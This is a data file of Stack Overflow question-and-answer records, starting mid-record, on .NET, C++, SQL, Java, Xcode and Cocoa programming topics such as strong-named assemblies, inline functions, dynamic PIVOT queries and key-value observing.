\"Thekey\";\nheader.Password = \"Thepassword\";\nps.ServiceAuthHeaderValue = header;\n\nstring WhatYouWant = ps.GetSomeStuffFromTheCloud(SomeId);\n\n", "score": 10}
{"title": "What is a .snk for?", "description": "What is a .snk file for?  I know it stands for Strongly Named Key, but all explanations of what it is and how it works goes over my head.\nIs there any simple explanation on how a strongly named key is used and how it works?\n", "answer": "The .snk file is used to apply a strong name to a .NET assembly. such a strong name consists of\n\na simple text name, version number,\nand culture information (if\nprovided)—plus a public key and a\ndigital signature.\n\nThe SNK contains a unique key pair - a private and public key that can be used to ensure that you have a unique strong name for the assembly. When the assembly is strongly-named, a \"hash\" is constructed from the contents of the assembly, and the hash is encrypted with the private key. Then this signed hash is placed in the assembly along with the public key from the .snk.\nLater on, when someone needs to verify the integrity of the strongly-named assembly, they build a hash of the assembly's contents, and use the public key from the assembly to decrypt the hash that came with the assembly - if the two hashes match, the assembly verification passes.\nIt's important to be able to verify assemblies in this way to ensure that nobody swaps out an assembly for a malicious one that will subvert the whole application. This is why non-strong-named assemblies aren't trusted in the same way that strongly-named assemblies are, so they can't be placed in the GAC. Also, there's a chain of trust - you can't generate a strongly-named assembly that references non-strongly-named assemblies.\nThe article \"The Secrets of Strong Naming (archived at the Wayback Machine)\". Does an excellent job of explaining these concepts in more detail. With pictures.\n", "score": 226}
{"title": "Why should I ever use inline code?", "description": "I'm a C/C++ developer, and here are a couple of questions that always baffled me.\n\nIs there a big difference between \"regular\" code and inline code?\nWhich is the main difference?\nIs inline code simply a \"form\" of macros?\nWhat kind of tradeoff must be done when choosing to inline your code?\n\nThanks\n", "answer": "Performance\nAs has been suggested in previous answers, use of the inline keyword can make code faster by inlining function calls, often at the expense of increased executables. “Inlining function calls” just means substituting the call to the target function with the actual code of the function, after filling in the arguments accordingly.\nHowever, modern compilers are very good at inlining function calls automatically without any prompt from the user when set to high optimisation. Actually, compilers are usually better at determining what calls to inline for speed gain than humans are.\nDeclaring functions inline explicitly for the sake of performance gain is (almost?) always unnecessary!\nAdditionally, compilers can and will ignore the inline request if it suits them. Compilers will do this if a call to the function is impossible to inline (i.e. using nontrivial recursion or function pointers) but also if the function is simply too large for a meaningful performance gain.\nOne Definition Rule\nHowever, declaring an inline function using the inline keyword has other effects, and may actually be necessary to satisfy the One Definition Rule (ODR): This rule in the C++ standard states that a given symbol may be declared multiple times but may only be defined once. If the link editor (= linker) encounters several identical symbol definitions, it will generate an error.\nOne solution to this problem is to make sure that a compilation unit doesn't export a given symbol by giving it internal linkage by declaring it static.\nHowever, it's often better to mark a function inline instead. This tells the linker to merge all definitions of this function across compilation units into one definition, with one address, and shared function-static variables.\nAs an example, consider the following program:\n// header.hpp\n#ifndef HEADER_HPP\n#define HEADER_HPP\n\n#include <cmath>\n#include <numeric>\n#include <vector>\n\nusing vec = std::vector<double>;\n\n/*inline*/ double mean(vec const& sample) {\n    return std::accumulate(begin(sample), end(sample), 0.0) / sample.size();\n}\n\n#endif // !defined(HEADER_HPP)\n\n// test.cpp\n#include \"header.hpp\"\n\n#include <iostream>\n#include <iomanip>\n\nvoid print_mean(vec const& sample) {\n    std::cout << \"Sample with x̂ = \" << mean(sample) << '\\n';\n}\n\n// main.cpp\n#include \"header.hpp\"\n\nvoid print_mean(vec const&); // Forward declaration.\n\nint main() {\n    vec x{4, 3, 5, 4, 5, 5, 6, 3, 8, 6, 8, 3, 1, 7};\n    print_mean(x);\n}\n\nNote that both .cpp files include the header file and thus the function definition of mean. Although the file is saved with include guards against double inclusion, this will result in two definitions of the same function, albeit in different compilation units.\nNow, if you try to link those two compilation units — for example using the following command:\n⟩⟩⟩ g++ -std=c++11 -pedantic main.cpp test.cpp\n\nyou'll get an error saying “duplicate symbol __Z4meanRKNSt3__16vectorIdNS_9allocatorIdEEEE” (which is the mangled name of our function mean).\nIf, however, you uncomment the inline modifier in front of the function definition, the code compiles and links correctly.\nFunction templates are a special case: they are always inline, regardless of whether they were declared that way. This doesn’t mean that the compiler will inline calls to them, but they won’t violate ODR. The same is true for member functions that are defined inside a class or struct.\n", "score": 45}
{"title": "How do you make Python / PostgreSQL faster?", "description": "Right now I have a log parser reading through 515mb of plain-text files (a file for each day over the past 4 years). My code currently stands as this: http://gist.github.com/12978. I've used psyco (as seen in the code) and I'm also compiling it and using the compiled version. It's doing about 100 lines every 0.3 seconds. The machine is a standard 15\" MacBook Pro (2.4ghz C2D, 2GB RAM)\nIs it possible for this to go faster or is that a limitation on the language/database?\n", "answer": "Don't waste time profiling.  The time is always in the database operations.  Do as few as possible.  Just the minimum number of inserts.\nThree Things.\nOne.  Don't SELECT over and over again to conform the Date, Hostname and Person dimensions.  Fetch all the data ONCE into a Python dictionary and use it in memory.  Don't do repeated singleton selects.  Use Python.\nTwo.  Don't Update.\nSpecifically, Do not do this.  It's bad code for two reasons.\ncursor.execute(\"UPDATE people SET chats_count = chats_count + 1 WHERE id = '%s'\" % person_id)\n\nIt be replaced with a simple SELECT COUNT(*) FROM ... .  Never update to increment a count.  Just count the rows that are there with a SELECT statement.  [If you can't do this with a simple SELECT COUNT or SELECT COUNT(DISTINCT), you're missing some data -- your data model should always provide correct complete counts.  Never update.]\nAnd.  Never build SQL using string substitution.  Completely dumb.\nIf, for some reason the SELECT COUNT(*) isn't fast enough (benchmark first, before doing anything lame) you can cache the result of the count in another table.  AFTER all of the loads.  Do a SELECT COUNT(*) FROM whatever GROUP BY whatever and insert this into a table of counts.  Don't Update.  Ever.\nThree.  Use Bind Variables.  Always.\ncursor.execute( \"INSERT INTO ... VALUES( %(x)s, %(y)s, %(z)s )\", {'x':person_id, 'y':time_to_string(time), 'z':channel,} )\n\nThe SQL never changes.  The values bound in change, but the SQL never changes.  This is MUCH faster.  Never build SQL statements dynamically.  Never.  \n", "score": 10}
{"title": "How can I determine if a remote drive has enough space to write a file using C#?", "description": "How can I determine if a remote drive has enough space for me to upload a given file using C# in .Net?\n", "answer": "There are two possible solutions. \n\nCall the Win32 function GetDiskFreeSpaceEx. Here is a sample program:\ninternal static class Win32\n{\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n    internal static extern bool GetDiskFreeSpaceEx(string drive, out long freeBytesForUser, out long totalBytes, out long freeBytes);\n\n}\n\nclass Program\n{\n    static void Main(string[] args)\n    {\n        long freeBytesForUser;\n        long totalBytes;\n        long freeBytes;\n\n        if (Win32.GetDiskFreeSpaceEx(@\"\\\\prime\\cargohold\", out freeBytesForUser, out totalBytes, out freeBytes)) {\n            Console.WriteLine(freeBytesForUser);\n            Console.WriteLine(totalBytes);\n            Console.WriteLine(freeBytes);\n        }\n    }\n}\n\nUse the system management interface. There is another answer in this post which describes this. This method is really designed for use in scripting languages such as PowerShell. It performs a lot of fluff just to get the right object. Ultimately, I suspect, this method boils down to calling GetDiskFreeSpaceEx.\n\nAnybody doing any serious Windows development in C# will probably end up calling many Win32 functions. The .NET framework just doesn't cover 100% of the Win32 API. Any large program will quickly uncover gaps in the .NET libraries that are only available through the Win32 API. I would get hold of one of the Win32 wrappers for .NET and include this in your project. This will give you instant access to just about every Win32 API.\n", "score": 10}
{"title": "Heisenbug: WinApi program crashes on some computers", "description": "Please help! I'm really at my wits' end.\nMy program is a little personal notes manager (google for \"cintanotes\").\nOn some computers (and of course I own none of them) it crashes with an unhandled exception just after start. \nNothing special about these computers could be said, except that they tend to have AMD CPUs.\nEnvironment: Windows XP, Visual C++ 2005/2008, raw WinApi.\nHere is what is certain about this \"Heisenbug\":\n1) The crash happens only in the Release version.\n2) The crash goes away as soon as I remove all GDI-related stuff.\n3) BoundChecker has no complains.\n4) Writing a log shows that the crash happens on a declaration of a local int variable! How could that be? Memory corruption?\nAny ideas would be greatly appreciated!\nUPDATE: I've managed to get the app debugged on a \"faulty\" PC. The results:\n\"Unhandled exception at 0x0044a26a in CintaNotes.exe: 0xC000001D: Illegal Instruction.\"\nand code breaks on\n0044A26A  cvtsi2sd    xmm1,dword ptr [esp+14h] \nSo it seems that the problem was in the \"Code Generation/Enable Enhanced Instruction Set\" compiler option. It was set to \"/arch:SSE2\" and was crashing on the machines that didn't support SSE2. I've set this option to \"Not Set\" and the bug is gone. Phew!\nThank you all very much for help!!\n", "answer": "\n4) Writig a log shows that the crash happen on a declaration of a local int variable! how could that be? Memory corruption?\n\nWhat is the underlying code in the executable / assembly? Declaration of int is no code at all, and as such cannot crash. Do you initialize the int somehow?\nTo see the code where the crash happened you should perform what is called a postmortem analysis.\nWindows Error Reporting\nIf you want to analyse the crash, you should get a crash dump. One option for this is to register for Windows Error Reporting - requires some money (you need a digital code signing ID) and some form filling. For more visit https://winqual.microsoft.com/ .\nGet the crash dump intended for WER directly from the customer\nAnother option is to get in touch witch some user who is experiencing the crash and get a crash dump intended for WER from him directly. The user can do this when he clicks on the Technical details before sending the crash to Microsoft - the crash dump file location can be checked there.\nYour own minidump\nAnother option is to register your own exception handler, handle the exception and write a minidump anywhere you wish. Detailed description can be found at Code Project Post-Mortem Debugging Your Application with Minidumps and Visual Studio .NET article.\n", "score": 10}
{"title": "How do I make sure a user is only logged in once?", "description": "A few years ago I developed a web app for which we wanted to make sure the users weren't sharing credentials.\nOne of the things we decided to to, was only allow the user to be logged in from one computer at a time. The way I did this, was to have a little iframe ping the server every N seconds; as long as the server had a heartbeat for a particular user (from a particular IP), that user was not allowed to log in from any other IP.\nThe solution, although approved by my manger, always seemed hacky to me. Also, it seems like it would be easy to circumvent.\nIs there a good way to make sure a web app user only logs in once? To be honest, I never understood why management even wanted this feature. Does it make sense to enforce this on distributed apps?\n", "answer": "I've implemented this by maintaining a hashtable of currently logged in users, the key was the username, the value was their last activity time.\nWhen logging in, you just check this hashtable for the key, and if it exists, reject the login.\nWhen the user does anything, you update the hashtable with the time (This is easy if you make it part of the core page framework).\nIf the time in the hashtable is greater than 20 minutes of inactivity, you remove them. You can do this every time the hashtable is checked, so even if you only had one user, and the tried to login several hours later, during that initial check, it would remove them from the hashtable for being idle.\nSome examples in C# (Untested):\npublic Dictionary<String,DateTime> UserDictionary\n{\n    get\n    {\n        if (HttpContext.Current.Cache[\"UserDictionary\"] != null)\n        {\n            return HttpContext.Current.Cache[\"UserDictionary\"] as Dictionary<String,DateTime>;\n        }\n        return new Dictionary<String,DateTime>();\n    }\n    set\n    {\n        HttpContext.Current.Cache[\"UserDictionary\"] = value;\n    }\n}\n\npublic bool IsUserAlreadyLoggedIn(string userName)\n{\n    removeIdleUsers();\n    return UserDictionary.ContainsKey(userName);\n}\n\npublic void UpdateUser(string userName)\n{\n    UserDictionary[userName] = DateTime.Now;\n\n    removeIdleUsers();\n}\n\nprivate void removeIdleUsers()\n{\n   for (int i = 0; i < UserDictionary.Length; i++)\n        {\n            if (user[i].Value < DateTime.Now.AddMinutes(-20))\n                user.RemoveAt(i);\n        }\n}\n\n", "score": 11}
{"title": "Grab and move application windows from a .NET app?", "description": "Is it possible for a .NET application to grab all the window handles currently open, and move/resize these windows?\nI'd pretty sure its possible using P/Invoke, but I was wondering if there were some managed code wrappers for this functionality.\n", "answer": "Yes, it is possible using the Windows API.\nThis post has information on how to get all window handles from active processes: http://www.c-sharpcorner.com/Forums/ShowMessages.aspx?ThreadID=35545\nusing System;\nusing System.Diagnostics;\n\nclass Program\n{\n    static void Main()\n    {\n       Process[] procs = Process.GetProcesses();\n       IntPtr hWnd;\n       foreach(Process proc in procs)\n       {\n          if ((hWnd = proc.MainWindowHandle) != IntPtr.Zero)\n          {\n             Console.WriteLine(\"{0} : {1}\", proc.ProcessName, hWnd);\n          }\n       }         \n    }\n }\n\nAnd then you can move the window using the Windows API: http://www.devasp.net/net/articles/display/689.html\n[DllImport(\"User32.dll\", ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]\n        private static extern bool MoveWindow(IntPtr hWnd, int x, int y, int cx, int cy, bool repaint);\n\n...\n\nMoveWindow((IntPtr)handle, (trackBar1.Value*80), 20 , (trackBar1.Value*80)-800, 120, true);\n\nHere are the parameters for the MoveWindow function:\n\nIn order to move the window, we use\n  the MoveWindow function, which takes\n  the window handle, the co-ordinates\n  for the top corner, as well as the\n  desired width and height of the\n  window, based on the screen\n  co-ordinates. The MoveWindow function\n  is defined as:\nMoveWindow(HWND hWnd, int nX, int\n  nY, int nWidth, int nHeight, BOOL\n  bRepaint);\nThe bRepaint flag\n  determines whether the client area\n  should be invalidated, causing a\n  WM_PAINT message to be sent, allowing\n  the client area to be repainted. As an\n  aside, the screen co-ordinates can be\n  obtained using a call similar to\n  GetClientRect(GetDesktopWindow(),\n  &rcDesktop) with rcDesktop being a\n  variable of type RECT, passed by\n  reference.\n\n(http://windows-programming.suite101.com/article.cfm/client_area_size_with_movewindow)\n", "score": 14}
{"title": "Strange unhandled exception from asp.net application - Validation of viewstate MAC failed", "description": "I don't know if anyone has seen this issue before but I'm just stumped. Here's the unhandled exception message that my error page is capturing. \n\nError Message:  Validation of\n  viewstate MAC failed. If this\n  application is hosted by a Web Farm or\n  cluster, ensure that configuration\n  specifies the same validationKey and\n  validation algorithm. AutoGenerate\n  cannot be used in a cluster.\nStack Trace:  at\n  System.Web.UI.ViewStateException.ThrowError(Exception\n  inner, String persistedState, String\n  errorPageMessage, Boolean\n  macValidationError)  at\n  System.Web.UI.ObjectStateFormatter.Deserialize(String\n  inputString)  at\n  System.Web.UI.ObjectStateFormatter.System.Web.UI.IStateFormatter.Deserialize(String\n  serializedState)  at\n  System.Web.UI.Util.DeserializeWithAssert(IStateFormatter\n  formatter, String serializedState) at\n  System.Web.UI.HiddenFieldPageStatePersister.Load()\n  at\n  System.Web.UI.Page.LoadPageStateFromPersistenceMedium()\n  at System.Web.UI.Page.LoadAllState()\n  at\n  System.Web.UI.Page.ProcessRequestMain(Boolean\n  includeStagesBeforeAsyncPoint, Boolean\n  includeStagesAfterAsyncPoint)  at\n  System.Web.UI.Page.ProcessRequest(Boolean\n  includeStagesBeforeAsyncPoint, Boolean\n  includeStagesAfterAsyncPoint) at\n  System.Web.UI.Page.ProcessRequest() \n  at\n  System.Web.UI.Page.ProcessRequestWithNoAssert(HttpContext\n  context)  at\n  System.Web.UI.Page.ProcessRequest(HttpContext\n  context)  at\n  ASP.generic_aspx.ProcessRequest(HttpContext\n  context)  at\n  System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()\n  at\n  System.Web.HttpApplication.ExecuteStep(IExecutionStep\n  step, Boolean& completedSynchronously)\nSource: System.Web\n\nAnybody have any ideas on how I could resolve this? Thanks.\n", "answer": "I seem to recall that this error can occur if you click a button/link etc before the page has fully loaded.\nIf this is the case, the error is caused by an ASP.net 2.0 feature called Event Validation. This is a security feature that ensures that postback actions only come from events allowed and created by the server to help prevent spoofed postbacks. This feature is implemented by having controls register valid events when they render (as in, during their actual Render() methods). The end result is that at the bottom of your rendered \nform tag, you'll see something like this:\n<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\"  value=\"AEBnx7v.........tS\" />\n\nWhen a postback occurs, ASP.net uses the values stored in this hidden field to ensure that the button you clicked invokes a valid event. If it's not valid, you get the exception that you've been seeing.\nThe problem you're seeing happens specifically when you postback before the EventValidation field has been rendered. If EventValidation is enabled (which it is, by default), but ASP.net doesn't see the hidden field when you postback, you also get the exception. If you submit a form before it has been entirely rendered, then chances are the EventValidation field has not yet been rendered, and thus ASP.net cannot validate your click.\nOne work around is of course to just disable event validation, but you have to be aware of the security implications. Alternatively, just never post back before the form has finished rendering. Of course, that's hard to tell your users, but perhaps you could disable the UI until the form has rendered?\nfrom http://forums.asp.net/p/955145/1173230.aspx\n", "score": 17}
{"title": "In Java, do I need to declare my collection synchronized if it's read-only?", "description": "I fill a collection one single time when my J2EE webapp starts.\nThen, several thread may access it at same time but only to read it.\nI know using a synchronized collection is mandatory for parallels write but do I still need it for parallels read ?\n", "answer": "Normally no because you are not changing the internal state of the collection in this case. When you iterate over the collection a new instance of the iterator is created and the state of the iteration is per iterator instance.\n\nAside note: Remember that by keeping a read-only collection you are only preventing modifications to the collection itself. Each collection element is still changeable.\nclass Test {\n    public Test(final int a, final int b) {\n        this.a = a;\n        this.b = b;\n    }\n\n    public int a;\n    public int b;\n}\n\npublic class Main {\n\n    public static void main(String[] args) throws Exception {\n        List<Test> values = new ArrayList<Test>(2);\n        values.add(new Test(1, 2));\n        values.add(new Test(3, 4));\n\n        List<Test> readOnly = Collections.unmodifiableList(values);\n        for (Test t : readOnly) {\n            t.a = 5;\n        }\n\n        for (Test t : values) {\n            System.out.println(t.a);\n        }\n    }\n\n}\n\nThis outputs:\n5\n5\n\nImportant considerations from @WMR answser.\n\nIt depends on if the threads that are\n  reading your collection are started\n  before or after you're filling it. If\n  they're started before you fill it,\n  you have no guarantees (without\n  synchronizing), that these threads\n  will ever see the updated values. \nThe reason for this is the Java Memory\n  Model, if you wanna know more read the\n  section \"Visibility\" at this link:\n  http://gee.cs.oswego.edu/dl/cpj/jmm.html\nAnd even if the threads are started\n  after you fill your collection, you\n  might have to synchronize because your\n  collection implementation could change\n  its internal state even on read\n  operations (thanks Michael\n  Bar-Sinai,\n  I didn't know such collections\n  existed).\nAnother very interesting read on the\n  topic of concurrency which covers\n  topics like publishing of objects,\n  visibility, etc. in much more detail\n  is Brian Goetz's book Java\n  Concurrency in\n  Practice.\n\n", "score": 20}
{"title": "need an algorithm for collapsing netblock ranges into lists of superset ranges", "description": "My math-fu is failing me! I need an efficient way of reducing network ranges to supersets, e.g. if I input list of IP ranges:\n\n1.1.1.1 to 2.2.2.5\n1.1.1.2 to 2.2.2.4\n10.5.5.5 to 155.5.5.5\n10.5.5.6 to 10.5.5.7\n\nI want to return the following ranges:\n\n1.1.1.1 to 2.2.2.5\n10.5.5.5 to 155.5.5.5\n\nNote: the input lists are not ordered (though they could be?).   The naive way to do this is to check every range in the list to see if the input range x is a subset, and if so, NOT insert range x.  However, whenever you insert a new range it might be a superset of existing ranges, so you have to check the existing ranges to see if they can be collapsed (e.g., removed from my list).\n", "answer": "This is a union of segments computation. An optimal algorithm (in O(nlog(n))) consists in doing the following:\n\nsort all endpoints (starting and ending points) in a list L (each endpoint should know the segment it belongs to). If an endpoint is equal to a starting point, the starting point should be considered smaller than the enpoint.\ngo through the sorted list L from left to right and maintain the number LE-RE, where LE is the number of left endpoints  that you have already passed, and RE is the number of right endpoints  that you have already passed.\neach time LE-RE reaches zero, you are at the end of a connected union of segments, and you know that the union of the segments you have seen before (since the previous return to zero) is one superset.\nif you also maintained the min and max, between each return to zero, you have the bounds of the superset.\n\nAt the end, you obtain a sorted list of disjoint supersets. Still, two supersets A and B can be adjacent (the endpoint of A is just before the starting point of B). If you want A and B to be merged, you can do this either by a simple postprocessing step, or by slightly modifying step 3: when LE-RE reaches zero, you would consider it the end of a superset only if the next element in L is not the direct successor of your current element.\n", "score": 18}
{"title": "Partial .csproj Files", "description": "Is it possible to split the information in a .csproj across more than one file? A bit like a project version of the partial class feature.\n", "answer": "You can not have more than one master csproj. But because the underneath wiring of the csproj is done using msbuild you can simply have multiple partial csproj that import each other. The solution file would see the most derived csproj.\nproject1.csproj\n<Project DefaultTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n    ....\n</Project>\n\nproject2.csproj\n<Project DefaultTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n    <Import Project=\"project1.csproj\" />\n    ...\n</Project>\n\nproject.csproj - this is the main project that is referred by the solution file.\n<Project DefaultTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n    <Import Project=\"project2.csproj\" />\n    ...\n</Project>\n\nBottom line is that using msbuild Import feature you can have partial csproj files where each one would contain definitions that the main project (project.csproj in my example) would use.\n\nVisual Studio will show a Security Warning for project dialog when you open your changed solution or project file. Choose the option Load Project Normally and press OK. When opening the solution again later the warning will not be shown because the configuration to Load Project Normally is stored in the suo file.\n", "score": 24}
{"title": "How do I create a bundle of reusable code in Xcode?", "description": "I am developing an iPhone app and have to parse xml files in order to put them into a database. I will also be using those same xml parsers in my app so users can import their own data. I was wondering how I can extract those xml parsers into a bundle or a library so I can use them both in my iPhone app and in a command line app where I just populate a sqlite3 database.\nThanks in advance!\n", "answer": "Create a static library project, then use the interproject dependency feature of Xcode to build them in the correct order and link the app with the static library. You'll need to have a common build directory set for all the projects for this to work correctly (at least you did around Xcode 3.0, didn't check if this is still a problem with 3.1).\nYou can set the build directory from the target or project's build settings (in the Get Info pane). To create an interpoject dependency:\n\nDrag the library project into the application project's Files & Groups pane.\nSet up target dependency in the application target's Get Info pane. Make it dependent on the library's target.\nDrag the library product in the application target's Link With Libraries step. You can find the library product by expanding the library project within the app project's Files & Groups (click the arrow).\n\nSounds more complicated than it is. It isn't much.\n(Small extras: yes, you need a common build folder as indicated in the Xcode Project Management Guide, and the Xcode Build System Guide can help you \"get\" Xcode's build system, which -- at the cost of starting a religion war -- I think is one of the most flexible and simple build systems out there.)\n", "score": 15}
{"title": "Pivot Table and Concatenate Columns", "description": "I have a database in the following format:\n ID    TYPE   SUBTYPE    COUNT   MONTH\n 1      A      Z          1       7/1/2008\n 1      A      Z          3       7/1/2008\n 2      B      C          2       7/2/2008\n 1      A      Z          3       7/2/2008\n\nCan I use SQL to convert it into this:\nID    A_Z   B_C   MONTH\n1     4     0     7/1/2008\n2     0     2     7/2/2008\n1     0     3     7/2/2008\n\nSo, the TYPE, SUBTYPE are concatenated into new columns and COUNT is summed where the ID and MONTH match.\nAny tips would be appreciated. Is this possible in SQL or should I program it manually?\nThe database is SQL Server 2005. \nAssume there are 100s of TYPES and SUBTYPES so and 'A' and 'Z' shouldn't be hard coded but generated dynamically.\n", "answer": "SQL Server 2005 offers a very useful PIVOT and UNPIVOT operator which allow you to make this code maintenance-free using PIVOT and some code generation/dynamic SQL\n/*\nCREATE TABLE [dbo].[stackoverflow_159456](\n    [ID] [int] NOT NULL,\n    [TYPE] [char](1) NOT NULL,\n    [SUBTYPE] [char](1) NOT NULL,\n    [COUNT] [int] NOT NULL,\n    [MONTH] [datetime] NOT NULL\n) ON [PRIMARY]\n*/\n\nDECLARE @sql AS varchar(max)\nDECLARE @pivot_list AS varchar(max) -- Leave NULL for COALESCE technique\nDECLARE @select_list AS varchar(max) -- Leave NULL for COALESCE technique\n\nSELECT @pivot_list = COALESCE(@pivot_list + ', ', '') + '[' + PIVOT_CODE + ']'\n        ,@select_list = COALESCE(@select_list + ', ', '') + 'ISNULL([' + PIVOT_CODE + '], 0) AS [' + PIVOT_CODE + ']'\nFROM (\n    SELECT DISTINCT [TYPE] + '_' + SUBTYPE AS PIVOT_CODE\n    FROM stackoverflow_159456\n) AS PIVOT_CODES\n\nSET @sql = '\n;WITH p AS (\n    SELECT ID, [MONTH], [TYPE] + ''_'' + SUBTYPE AS PIVOT_CODE, SUM([COUNT]) AS [COUNT]\n    FROM stackoverflow_159456\n    GROUP BY ID, [MONTH], [TYPE] + ''_'' + SUBTYPE\n)\nSELECT ID, [MONTH], ' + @select_list + '\nFROM p\nPIVOT (\n    SUM([COUNT])\n    FOR PIVOT_CODE IN (\n        ' + @pivot_list + '\n    )\n) AS pvt\n'\n\nEXEC (@sql)\n\n", "score": 33}
{"title": "Fastest way to get productive in VS 08 and C#", "description": "I have recently been working with Python using Komodo Edit and other simpler editors but now I am doing a project which is to be done in C# using VS 08. I would appreciate any hints on how to get productive on that platform as quickly as possible.\n", "answer": "As far as becoming proficient with C# I would highly recommend Programming C# and C# in Depth.\nFor Visual Studio, start poking around in the IDE a lot, play around, get familiar with it. Start with simple projects and explore all the different aspects. Learn how to optimize Visual Studio and get familiar with some of the great keyboard shortcuts / hidden features of the IDE.\nDefinitely do each of the following at least once:\nProjects:\n\nCreate a simple console application (e.g. hello world)\nCreate a class library (managed .dll) and use it from another application you create\nCreate a simple windows application\nCreate a simple asp.net web app\n\nDebugging:\n\nDebug a command line app\nGet familiar with: breakpoints, the locals and watch windows, step over, step into, step out of, continue, stop debugging\nCreate a command line app which uses a function in a class library. Store the dll and symbol file (.pdb) for the library but delete the source code, debug through app as it goes into the library\nDebug into a webservice\nLearn how to use ILDasm and ILAsm\n\nCommand Line:\n\nGet familiar with the Visual Studio command line environment\nBuild using only the command line\nDebug from the command line using devenv.exe /debugexe\nUse ILDasm / ILAsm from the command line to disassemble a simple app into .IL, reassemble it into a differently named file, test to see that it still works\n\nTesting:\n\nCreate unit tests (right click in a method, select the option to create a test)\nLearn how to: run all unit tests, run all unit tests under the debugger, rerun failed unit tests, see details on test failures, run a subset of unit tests\nLearn how to collect code coverage statistics for your tests\n\nSource Control:\n\nLearn how to interact with your source control system of choice while developing using VS\n\nRefactoring et al:\n\nBecome familiar with all of the built-in refactorings (especially rename and extract method)\nUse \"Go To Definition\"\nUse \"Find All References\"\nUse \"Find In Files\" (ctrl-shift-F)\n\nIDE & Keyboard Shortcuts:\n\nLearn how to use the designer well for web and winforms\nGet very familiar with the Solution Explorer window\nExperiment with different window layouts until you find one your comfortable with, keep experimenting later to see if that's still the best choice\nLearn the ins and outs of intellisense, use it to your advantage as much as possible\nLearn the keyboard shortcut for everything you do\n\n", "score": 11}
{"title": "Visual Studio 2008 - Add Reference", "description": "When adding a DLL as a reference to an ASP.Net project, VS2008 adds several files to the bin directory.  If the DLL is called foo.dll, VS2008 adds foo.dll.refresh, foo.pdb and foo.xml.  I know what foo.dll is :-), why does VS2008 add the other three files?  What do those three files do?  Can I delete them?  Do they need to be added in source control?\n", "answer": "Source Control:\nBen Straub said in a comment to this post: The .dll.refresh files should be added to the source control if required, while the .xml, .pdb and of course the .dll files should not be added.\nJohn Rudy explained when to add the .refresh file:\n\nWhy is this a good thing (sometimes)?\n  Let's say you're in a team\n  environment. Someone checks in code\n  for foo.dll, and your build system\n  builds a new DLL, outputting it in a\n  file share on a server. Your refresh\n  file points to that server copy of the\n  DLL. Next time you build, VS will\n  auto-magically grab the latest and\n  greatest copy of that DLL.\n\n.xml like David Mohundro said:\n\nThe xml file is there for XML comments\n  and intellisense. Visual Studio will\n  parse that and display the XML\n  comments that were added when you call\n  methods in those DLLs.\n\n.pdb like David Mohundro said:\n\nThe pdb is there for debugging and\n  symbols. If you get an exception\n  thrown from it, you'll be able to get\n  stacktraces, etc. You're in control of\n  choosing whether or not the PDB is\n  built.\n\n.refresh from a blog post about .refresh files:\n\nIt tells VS where to look for updated\n  versions of the dll with the same base\n  name. They're text files, you can open\n  them and see the path it's using.\nTheir purpose is to prevent you from\n  having to copy new versions yourself.\n  In VS2003, the project file would\n  contain the source location of the\n  reference, but since VS2005 doesn't\n  use project files for ASP.NET\n  projects, this is the replacement for\n  that particular functionality.\n\n", "score": 20}
{"title": "What's the nicest way to do observer/observable in objective-c (iphone version)", "description": "I'm used to coding Java Swing UIs, and in those if you have some properties that change, and you want your UI to update, you would implement the observer/observable pattern. In Java you do this normally by having your class maintain a list of listeners that it notifies of different events.\nI've played with Objective-C on the Mac, and that has KVC and binding which seems to work very nicely, and requires less code. The iPhone SDK doesn't seem to have this functionality though, so my question is:\nIf I have a class that holds data that changes, what's the best way for me to register a UI component with that class so that it can be notified of changes in the data that it needs to display?\n", "answer": "There are two built-in ways of doing observation in Cocoa:  Key-Value Observing and notifications.  In neither system do you need to maintain or notify a collection of observers yourself; the framework will handle that for you.\nKey-Value Observing (KVO) lets you observe a property of an object — including even a property that represents a collection — and be notified of changes to that property.  You just need to send the object -addObserver:forKeyPath:options:context: passing the object you want to receive updates, the key path of the property (relative to the receiver) for which you want to receive updates, and the types of updates you want to receive.  (There are similar methods you can use if you want to observe a property representing a collection.)\nNotifications are older and heavier-weight.  You register with an NSNotificationCenter — usually the default center — an object and selector pair to be passed a notification when an event occurs.  The notification object itself can contain arbitrary data via its userInfo property, and you can choose to observe all notifications of a specific name rather than those that apply to a particular object.\nWhich should you use in any particular case?  In general, if you care about changes to a specific property of a specific object, use Key-Value Observing.  That's what it's designed for and it's intentionally lightweight.  (Among other uses, it is the foundation on which Cocoa Bindings are built.)  If you care about a change in state that isn't represented by a property, then notifications are more appropriate.\nFor example, to stay in sync when the user changes the name of a model object, I'd use KVO.  To know when an entire object graph was saved, I'd use notifications.\n", "score": 37}
{"title": "Changing the application pool through a Web Deployment Project", "description": "Is there a way to configure a Visual Studio 2005 Web Deployment Project to install an application into a named Application Pool rather than the default app pool for a given web site?\n", "answer": "There is a good article describing custom actions here:\nScottGu's Blog\nThe question you asked is answered about halfway through the comments by 'Ryan', unfortunately it's in VB, but it shouldn't be hard to translate:\nPrivate Sub assignApplicationPool(ByVal WebSite As String, ByVal Vdir As String, ByVal appPool As String)\n   Try\n     Dim IISVdir As New DirectoryEntry(String.Format(\"IIS://{0}/W3SVC/1/Root/{1}\", WebSite, Vdir))\n     IISVdir.Properties.Item(\"AppPoolId\").Item(0) = appPool\n     IISVdir.CommitChanges()\n   Catch ex As Exception\n     Throw ex\n   End Try\n End Sub\n\n Private strServer As String = \"localhost\"\n Private strRootSubPath As String = \"/W3SVC/1/Root\"\n Private strSchema As String = \"IIsWebVirtualDir\"\n Public Overrides Sub Install(ByVal stateSaver As IDictionary)\n   MyBase.Install(stateSaver)\n   Try\n     Dim webAppName As String = MyBase.Context.Parameters.Item(\"TARGETVDIR\").ToString\n     Dim vdirName As String = MyBase.Context.Parameters.Item(\"COMMONVDIR\").ToString\n     Me.assignApplicationPool(Me.strServer, MyBase.Context.Parameters.Item(\"TARGETVDIR\").ToString, MyBase.Context.Parameters.Item(\"APPPOOL\").ToString)\n   Catch ex As Exception\n     Throw ex\n   End Try\n End Sub\n\n...Where APPPOOL is supplied as an argument in the Custom Action.\n", "score": 12}
